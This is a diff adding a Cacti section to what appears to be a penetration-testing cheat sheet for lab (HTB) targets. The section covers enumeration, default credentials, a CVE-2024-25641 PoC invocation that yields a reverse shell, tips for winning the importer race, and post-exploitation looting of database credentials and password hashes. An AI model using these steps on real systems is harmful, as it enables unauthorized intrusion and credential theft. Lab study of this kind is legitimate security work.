@@ -572,6 +572,44 @@ python3 PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
 
 ---
 
+## Cacti
+
+Open-source network graphing/monitoring (PHP + MySQL). Frequently served under a `/cacti/` sub-path on its own vhost.
+
+### Enumeration
+
+```bash
+# Version is in the login-page footer, CHANGELOG, or include/cacti_version
+curl -s http://cacti.target.htb/cacti/CHANGELOG | head
+# Default cred worth a try: admin:admin (forces a change on first login)
+# App path matters: login redirects to …/cacti/ — real paths are /cacti/index.php etc.
+```
+
+### Attacking
+
+**CVE-2024-25641 — Authenticated arbitrary file write → RCE (Cacti ≤ 1.2.26, fixed 1.2.27):**
+
+The **Package Import** feature (Console → Import/Export → Import Packages) writes bundled files to disk without constraining path/extension, so a `.php` file smuggled inside the package lands in the webroot and executes as the web user.
+
+```bash
+# Needs a valid admin session (crack/reuse the admin hash first).
+# Package = XML bundle of files + a signature; the importer validates the sig
+# against a key embedded IN the package → a self-signed package passes.
+python3 exploit.py --url http://cacti.target.htb --user admin --password <pw> \
+        --lhost <tun0> --lport 9001            # D3Ext PoC → reverse shell as www-data
+
+# Payload lands in the webroot's resource dir, triggered by GET:
+#   http://cacti.target.htb/cacti/resource/<rand>.php
+```
+
+> [!warning] **The importer is racy.** The 2-step import references the PHP upload temp (`/tmp/phpXXXX`), which is deleted after the preview request; if the confirm POST loses the race the payload 404s. **Just re-run** until it lands. Also: the app is often under `/cacti/` — a PoC that hits the bare host writes/triggers the wrong paths (derive the base from the post-login redirect).
+
+> [!note] The signature "check" is **presence-only** — it validates against a key *inside the package you supplied*, not a trusted one, so a self-signed package is accepted. Same class as [[Exploits/Signature Verification Bypass|Signature Verification Bypass]] (CWE-347).
+
+**Post-RCE looting** — Cacti keeps its DB creds in `include/config.php` (`$database_username`/`$database_password`, often `cactiuser:cactiuser`); that DB's `user_auth` table holds the bcrypt hashes for every Cacti user (crack → password reuse to a system account). Read it as the web user before pivoting.
+
+---
+
 ## osTicket
 
 ### Enumeration
@@ -1399,5 +1437,5 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 ---
 
 *Created: 2026-03-20*
-*Updated: 2026-07-30*
-*Model: claude-opus-4-8*
+*Updated: 2026-08-25*
+*Model: claude-opus-5*
